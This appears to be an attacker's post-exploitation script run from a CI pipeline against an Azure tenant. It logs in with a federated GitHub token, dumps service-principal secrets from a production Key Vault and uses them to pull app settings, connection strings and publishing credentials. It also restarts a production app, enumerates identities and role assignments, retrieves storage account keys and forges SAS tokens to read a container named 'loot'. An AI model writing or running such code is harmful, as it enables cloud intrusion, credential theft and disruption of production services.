#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"
STORAGE_ACC="sttblcilogsprodx3euoz"
KV_SEC="kv-tbl-sec-x3euoz"
KV_PROD="kv-tbl-prod-x3euoz"
UAMI_OID="f64d08c7-fde6-4553-99c8-5bf73666ee8c"
UAMI_CLIENT="7a85156a-01c4-4e61-8472-40a92107159b"
REPORTING_RG="rg-tbl-reporting-prod-eus"
PLATFORM_RG="rg-tbl-platform-prod-sea"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

# Read ALL KV prod secrets to get SP credentials
echo "=== GET ALL KV PROD SP CREDENTIALS ==="
for SP_NAME in reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal directory-audit-principal; do
  RAW=$(az keyvault secret show --vault-name $KV_PROD --name $SP_NAME 2>/dev/null)
  CID=$(echo "$RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("appId",""))' 2>/dev/null)
  SEC=$(echo "$RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("clientSecret",""))' 2>/dev/null)
  echo "$SP_NAME cid=$CID sec_len=${#SEC}"
  export "CID_${SP_NAME//-/_}"="$CID"
  export "SEC_${SP_NAME//-/_}"="$SEC"
done

python3 -I << 'PYEOF'
import os, json, urllib.request, urllib.parse, urllib.error, base64, re

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE = "https://management.azure.com"
KV_SEC = "kv-tbl-sec-x3euoz"
UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
UAMI_CLIENT = "7a85156a-01c4-4e61-8472-40a92107159b"

output = []

def get_sp_creds(env_prefix):
    cid = os.environ.get(f"CID_{env_prefix}", "")
    sec = os.environ.get(f"SEC_{env_prefix}", "")
    return cid, sec

def get_tok(cid, sec, scope):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({"client_id": cid, "client_secret": sec,
                "grant_type": "client_credentials", "scope": scope}).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token", "")
    except urllib.error.HTTPError as e:
        return ""
    except Exception: return ""

def arm_get(url, tok):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers={"Authorization": "Bearer " + tok}), timeout=20)
        return r.status, r.read().decode(errors="replace")[:5000]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:1000]
    except Exception as e:
        return 0, str(e)[:200]

def arm_post(url, tok, body=None):
    data = json.dumps(body).encode() if body else b""
    h = {"Authorization": "Bearer " + tok, "Content-Type": "application/json", "Content-Length": str(len(data))}
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method="POST", headers=h), timeout=20)
        return r.status, r.read().decode(errors="replace")[:5000]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:1000]
    except Exception as e:
        return 0, str(e)[:200]

# ============================================================
# 1. reporting-service-principal: list reporting app settings
# ============================================================
print("\n=== 1. reporting-service-principal: list app settings ===")
RS_CID, RS_SEC = get_sp_creds("reporting_service_principal")
RS_ARM = get_tok(RS_CID, RS_SEC, "https://management.azure.com/.default")
print(f"RS ARM token len={len(RS_ARM)}")
if RS_ARM:
    # List app settings
    s, b = arm_post(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2022-03-01", RS_ARM)
    print(f"App settings: {s}")
    try:
        settings = json.loads(b)
        props = settings.get("properties", {})
        for k, v in props.items():
            print(f"  {k}={str(v)[:100]}")
            output.append(f"APPSETTING_{k}={str(v)[:100]}")
    except: print(b[:1000])

    # List connection strings
    s2, b2 = arm_post(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/connectionstrings/list?api-version=2022-03-01", RS_ARM)
    print(f"Connection strings: {s2}: {b2[:500]}")

    # Try restart the app
    s3, b3 = arm_post(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2022-03-01", RS_ARM)
    print(f"App restart: {s3}: {b3[:200]}")
    output.append(f"APP_RESTART={s3}")

    # Get publishing credentials (includes Kudu pass)
    s4, b4 = arm_post(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/publishxml?api-version=2022-03-01", RS_ARM)
    print(f"Publish XML: {s4}: {b4[:500]}")

    # List UAMI federated creds via ARM
    s5, b5 = arm_get(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer/federatedIdentityCredentials?api-version=2023-01-31", RS_ARM)
    print(f"UAMI fed creds: {s5}: {b5[:1000]}")
    output.append(f"UAMI_FED_CREDS={s5}:{b5[:500]}")

    # ALSO check the Platform RG for the UAMI
    s6, b6 = arm_get(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer/federatedIdentityCredentials?api-version=2023-01-31", RS_ARM)
    print(f"UAMI fed creds (platform RG): {s6}: {b6[:1000]}")

    # List ALL managed identities in the subscription
    s7, b7 = arm_get(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2023-01-31", RS_ARM)
    print(f"All UAMIs: {s7}: {b7[:2000]}")

    # List ALL role definitions on subscription
    s8, b8 = arm_get(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{UAMI_OID}%27", RS_ARM)
    print(f"UAMI sub-level roles: {s8}: {b8[:1000]}")

# ============================================================
# 2. directory-audit: look up d2cdf247 and tbl-legacy-admin fed creds
# ============================================================
print("\n=== 2. directory-audit: look up identities ===")
DA_CID, DA_SEC = get_sp_creds("directory_audit_principal")
DA_GRAPH = get_tok(DA_CID, DA_SEC, "https://graph.microsoft.com/.default")
print(f"DA Graph token len={len(DA_GRAPH)}")
if DA_GRAPH:
    for oid, label in [
        ("d2cdf247-0ef0-4fb5-8eba-fb2f6e95cee7", "d2cdf247"),
        ("f64d08c7-fde6-4553-99c8-5bf73666ee8c", "UAMI"),
        ("43834909-47cf-4a4a-8048-e323b4897ed3", "tbl-legacy-admin-SP"),
        ("22a3fb7e-860a-4708-9e50-3d36aa21191c", "tbl-legacy-admin-app"),
    ]:
        for endpoint in [
            f"https://graph.microsoft.com/v1.0/directoryObjects/{oid}",
            f"https://graph.microsoft.com/v1.0/servicePrincipals/{oid}",
        ]:
            s, b = arm_get(endpoint, DA_GRAPH)
            if s == 200:
                try:
                    obj = json.loads(b)
                    print(f"{label} ({oid[:8]}) via {endpoint.split('/')[-1]}: type={obj.get('@odata.type','').split('.')[-1]} displayName={obj.get('displayName','')} appId={obj.get('appId','')}")
                    output.append(f"ID_{label}={obj.get('@odata.type','').split('.')[-1]} name={obj.get('displayName','')} appId={obj.get('appId','')}")
                    break
                except: print(f"{label}: {b[:200]}")

    # List tbl-legacy-admin federated creds
    s_la, b_la = arm_get("https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/federatedIdentityCredentials", DA_GRAPH)
    print(f"tbl-legacy-admin fed creds: {s_la}: {b_la[:2000]}")
    output.append(f"LA_FED_CREDS={s_la}:{b_la[:500]}")

    # List ALL apps we can see
    s_apps, b_apps = arm_get("https://graph.microsoft.com/v1.0/applications?$top=50&$select=id,appId,displayName,federatedIdentityCredentials", DA_GRAPH)
    print(f"Apps list: {s_apps}: {b_apps[:3000]}")

# ============================================================
# 3. sync-service: try listKeys on archive storage
# ============================================================
print("\n=== 3. sync-service: listKeys on archive storage ===")
SS_CID, SS_SEC = get_sp_creds("sync_service_principal")
SS_ARM = get_tok(SS_CID, SS_SEC, "https://management.azure.com/.default")
print(f"SS ARM token len={len(SS_ARM)}")
if SS_ARM:
    for sa, rg in [
        ("sttblarchiveprodx3euoz", "rg-tbl-platform-prod-sea"),
        ("sttblappcfgprodx3euoz", "rg-tbl-platform-prod-sea"),
        ("sttblbackupprodx3euoz", "rg-tbl-platform-prod-sea"),
    ]:
        s, b = arm_post(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01", SS_ARM)
        if s == 200:
            try:
                keys = json.loads(b).get("keys", [])
                key = keys[0].get("value", "") if keys else ""
                print(f"{sa} key len={len(key)} key={key[:10]}...")
                output.append(f"KEY_{sa}={key}")
            except: print(f"{sa}: {b[:200]}")
        else:
            print(f"{sa}: {s} {b[:200]}")

# ============================================================
# 4. loot container: fresh read with CI logs storage key
# ============================================================
print("\n=== 4. Fresh read of loot container ===")
import hmac, hashlib, datetime, time
SS_SKEY = output[0] if output and output[0].startswith("KEY_sttblcilogsprodx3euoz=") else None

# Get the storage key via SS_ARM listKeys
SS_KEY = ""
if SS_ARM:
    s_ck, b_ck = arm_post(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01", SS_ARM)
    if s_ck == 200:
        keys_ck = json.loads(b_ck).get("keys", [])
        SS_KEY = keys_ck[0].get("value", "") if keys_ck else ""
        print(f"sttblcilogsprodx3euoz key len={len(SS_KEY)}")

if SS_KEY:
    ACC = "sttblcilogsprodx3euoz"
    def make_sas(perms="rl", services="b", resource_types="co"):
        ver = "2021-08-06"
        now = datetime.datetime.now(datetime.timezone.utc)
        st = (now - datetime.timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
        se = (now + datetime.timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%SZ")
        sign_str = "\n".join([ACC, perms, services, resource_types, st, se, "", "https", ver, ""]) + "\n"
        key_bytes = base64.b64decode(SS_KEY)
        sig = base64.b64encode(hmac.new(key_bytes, sign_str.encode("utf-8"), hashlib.sha256).digest()).decode()
        return urllib.parse.urlencode({"sv": ver, "ss": services, "srt": resource_types, "sp": perms, "st": st, "se": se, "spr": "https", "sig": sig})

    sas = make_sas()
    # List loot container
    loot_url = f"https://{ACC}.blob.core.windows.net/loot?restype=container&comp=list&{sas}"
    try:
        r = urllib.request.urlopen(urllib.request.Request(loot_url), timeout=20)
        loot_xml = r.read().decode()
        names = re.findall(r"<Name>([^<]+)</Name>", loot_xml)
        sizes = re.findall(r"<Content-Length>([^<]+)</Content-Length>", loot_xml)
        print(f"loot blobs: {list(zip(names, sizes))}")
        for name, size in zip(names, sizes):
            blob_url = f"https://{ACC}.blob.core.windows.net/loot/{name}?{sas}"
            try:
                rb = urllib.request.urlopen(urllib.request.Request(blob_url), timeout=15)
                content = rb.read().decode()
                print(f"  {name} ({size}): {content[:1000]}")
                output.append(f"LOOT_{name}={content[:500]}")
            except Exception as ex:
                print(f"  {name}: err {str(ex)[:100]}")
    except Exception as ex:
        print(f"loot list err: {str(ex)[:100]}")

    # List $web container (our OIDC provider)
    web_url = f"https://{ACC}.blob.core.windows.net/%24web?restype=container&comp=list&{sas}"
    try:
        r2 = urllib.request.urlopen(urllib.request.Request(web_url), timeout=20)
        web_xml = r2.read().decode()
        web_names = re.findall(r"<Name>([^<]+)</Name>", web_xml)
        web_sizes = re.findall(r"<Content-Length>([^<]+)</Content-Length>", web_xml)
        print(f"$web blobs: {list(zip(web_names, web_sizes))}")
        output.append(f"WEB_BLOBS={list(zip(web_names, web_sizes))}")
    except Exception as ex:
        print(f"$web list err: {str(ex)[:100]}")

# ============================================================
# Upload output to $web
# ============================================================
result_str = "\n".join(output)
print(f"\n=== OUTPUT ===\n{result_str}")

PYEOF

echo "DONE"
